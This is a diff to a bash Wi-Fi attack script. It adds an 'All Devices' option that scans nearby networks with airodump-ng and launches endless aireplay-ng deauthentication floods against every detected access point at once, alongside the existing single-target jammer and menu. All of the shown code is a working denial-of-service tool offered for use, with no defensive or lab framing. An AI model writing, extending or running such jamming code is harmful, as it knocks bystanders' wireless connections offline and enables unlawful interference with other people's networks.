@@ -45,27 +45,24 @@ echo -e "[${Green}${wifiInterface}${White}] Enabled!"
 fi
 }
 
-
 menu () {        ##### Display available options #####
-echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
-echo -e "      ${Red}[${Blue}1${Red}] ${Green}Wifi Hacking"
-echo -e "      ${Red}[${Blue}2${Red}] ${Green}Wifi Jammer"
-echo -e "      ${Red}[${Blue}3${Red}] ${Green}Exit\n\n"
+echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hacking"
+echo -e "      ${Red}[${Blue}2${Red}] ${Green}Jammer"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}Exit"
 while true; do
-echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
-read -p "└─────►$(tput setaf 7) " option
+echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Yellow}Menu${Green}]:"
+read -p "└─►$(tput setaf 7) " option
 case $option in
   1) echo -e "\n[${Green}Selected${White}] Option 1 Wifi Hacking..."
      wifiHacking
      ;;
-  2) echo -e "\n[${Green}Selected${White}] Option 2 Wifi Jammer..."
+  2) echo -e "[${Green}Selected${White}] Option 2 Wifi Jammer..."
      wifiJammer
      exit 0
      ;;
-  3) echo -e "${Red}\nThank You for using the script,\nHappy Hacking ${White}:)\n"
-     exit 0
+  3) exit 0
      ;;
-  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
+  *) echo -e "${White}[${Red}Error${White}] Please select correct option..."
      ;;
 esac
 done
@@ -134,11 +131,23 @@ wordlist
 
 wifiJammer () {        ##### Sending unlimited DeAuth #####
 monitor
-airodump-ng --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 5 ; kill $!  
-echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
-sleep 0.5
-echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
-aireplay-ng --deauth 0 -a $bssid $wifiInterfaceMon > /dev/null
+if [[ "$targetAll" == "true" ]]; then
+  echo -e "[${Green}All Targets${White}] Jamming all devices on detected networks..."
+  while read -r line; do
+    bssid=$(echo "$line" | cut -d ";" -f 4)
+    channel=$(echo "$line" | cut -d ";" -f 6)
+    airodump-ng --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 5 ; kill $!
+    aireplay-ng --deauth 0 -a $bssid $wifiInterfaceMon > /dev/null &
+  done < generated-01.kismet.csv
+  echo -e "[${Green}DoS${White}] Jamming all networks. Press ctrl+c to stop."
+  wait
+else
+  airodump-ng --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 5 ; kill $!
+  echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
+  sleep 0.5
+  echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
+  aireplay-ng --deauth 0 -a $bssid $wifiInterfaceMon > /dev/null
+fi
 }
 
 monitor () {        ##### Monitor mode, scan available networks & select target #####
@@ -148,18 +157,24 @@ trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv ha
 airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 20 ; kill $!
 sed -i '1d' generated-01.kismet.csv
 kill %1
-echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
+echo -e "${Red}SerialNo        WiFi Network${White}"
 cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
+echo -e "${Green}0${White}         All Devices"
 targetNumber=1000
-while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
-echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
-read -p "└─────►$(tput setaf 7) " targetNumber
+while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 0 ]; do 
+echo -e "${Green}┌─[${Red}Select Target${Green}]:"
+read -p "└─►$(tput setaf 7) " targetNumber
 done
+if [ $targetNumber -eq 0 ]; then
+targetAll=true
+echo -e "\n[${Green}All Networks${White}] Preparing for attack..."
+else
+targetAll=false
 targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
 bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
 channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
-rm generated-01.kismet.csv 2> /dev/null
 echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
+fi
 }
 
 spinner() {        ##### Animation while scanning for available networks #####
